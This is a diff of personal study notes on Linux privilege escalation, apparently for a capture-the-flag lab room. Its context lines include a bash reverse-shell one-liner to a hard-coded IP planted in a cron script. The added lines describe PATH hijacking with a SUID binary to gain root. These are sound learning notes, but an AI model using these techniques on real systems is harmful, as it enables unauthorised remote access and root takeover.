@@ -81,10 +81,11 @@ other tools like: LinEnum / LES (Linux exploit suggester) / Linux smart enumerat
 - When a task has `* * * * *` this means it runs every minute
 - Set up a reverse shell inside the script: `bash -i >& /dev/tcp/10.113.104.156/4545 0>&1`, and make sure the script is executable using chmod +x script.sh and set up a listener
 
-<span style="color:rgb(172, 57, 163)"><b>PATH:</b></span> 
+<span style="color:rgb(172, 57, 163)"><b>PATH (im shit at this):</b></span> 
 - If a folder for which your user has write permission is located in the path (`echo $PATH`), you could potentially hijack an application to run a script
 - If we type “thm” to the command line, these are the locations Linux will look in for an executable called "thm".
 - So if there is no path defined for "THM" the system will look at the PATH environment variable:
     ![[Pasted image 20260720231646.png]]
 - We can add a directory to the PATH so the script looks for the executable there first, using the command: `export PATH=/tmp:$PATH`
-- 
+- We create a script, compile it using gcc, set the SUID bit using `chmod u+s`
+- If any writable folder is listed under PATH we could create a binary named "thm" under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege
